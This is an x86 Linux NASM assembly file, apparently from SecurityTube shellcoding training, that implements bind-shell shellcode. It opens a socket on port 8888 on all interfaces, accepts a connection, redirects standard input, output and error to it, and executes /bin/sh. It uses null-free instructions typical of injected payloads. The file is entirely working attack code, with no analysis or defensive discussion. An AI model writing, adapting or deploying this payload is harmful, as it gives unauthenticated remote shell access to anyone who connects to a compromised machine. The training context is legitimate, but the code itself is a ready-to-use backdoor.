; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 


global _start			



section .text
_start:
	; Message 1
	xor eax, eax
	mov al, 0x4
	xor ebx, ebx
	mov bl, 1
	; Binding port message
	push 0x0a2e2e2e
	push 0x74726f70
	push 0x20676e69
	push 0x646e6942
	mov ecx,esp
	xor edx, edx
	; Message length
	mov dl, 16
	int 0x80


	; Socket - 359
	; int socket (
    ;  int domain = 2;
    ;  int type = 1;
    ;  int protocol = 0;
	; ) =  14;
	xor eax, eax
	mov ax, 0x167
	xor ebx, ebx
	mov bl, 2
	xor ecx, ecx
	mov cl, 1
	xor edx, edx
	int 0x80
	push eax


	; Bind - 361
	xor eax, eax
	mov ax, 0x169
	pop ebx
	xor ecx, ecx
	push dword ecx 		; push 0 => ip 0.0.0.0
    push ecx		; port 8888, big endian
    push word 0xb822 	; port 8888, big endian
    push word 2 
	mov ecx, esp
	xor edx, edx
	mov dl, 0x10 ; 16 

	push ebx
	
	int 0x80


	; Listen - 363
	; int listen (
    ;  int s = 14;
    ;  int backlog = 0;
	; ) =  0;
	xor eax, eax
	mov ax, 0x16b
	pop ebx
	push ebx
	xor ecx, ecx
	int 0x80


	; Accept - 364
	; int accept (
    ; 	int sockfd = 14;
    ; 	sockaddr_in * addr = 0x00000000 => 
    ;     none;
    ; 	int addrlen = 0x00000010 => 
    ;     none;
	; ) =  19;
	xor eax, eax
	mov ax, 0x16c
	pop ebx
	xor ecx, ecx
	xor edx, edx
	mov dl, 0x10 ; 16 
	int 0x80
	;mov [accept_res], eax
	push eax


	;dup2 - 0
	xor eax, eax
	mov al, 0x3f
	;mov ebx, [accept_res]
	pop ebx
	push ebx
	xor ecx, ecx
	int 0x80
	;dup2 - 1
	xor eax, eax
	mov al, 0x3f
	pop ebx
	push ebx
	;mov ebx, [accept_res]
	xor ecx, ecx
	mov cl, 1
	int 0x80
	;dup2 - 2
	xor eax, eax
	mov al, 0x3f
	;mov ebx, [accept_res]
	pop ebx
	xor ecx, ecx
	mov cl, 2
	int 0x80


	; Execve
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80


;section .bss
;	socket resd 1
;	accept_res	resd 1